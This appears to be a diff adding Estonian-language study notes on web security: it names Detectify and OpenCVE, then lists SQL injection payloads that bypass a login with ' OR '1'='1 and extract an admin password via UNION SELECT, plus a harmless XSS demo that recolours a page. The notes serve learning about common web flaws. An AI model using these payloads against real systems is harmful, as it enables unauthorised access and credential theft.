@@ -1,3 +1,16 @@
 Testkeskkonnas peaks olema ka cert rakendatud
 Detectify - https://detectify.com/
 Opencve
+
+Lihtne SQLInjection
+Asendab parooli tõese vastusega
+  username: admin
+  password: ' OR '1' = '1
+Kuvab parooli / hashi
+  'UNION SELECT 1, password,'admin' FROM users WHERE username='admin' #
+Kuvab kõik kasutajad ja paroolid
+  SELECT * FROM users WHERE username = '$USER' AND PASSWORD = '$PASSWORD';
+XSS (Cross site scripting)
+  <script>
+    document.body.style.setProperty("backround-color", "black","important");
+  </script>
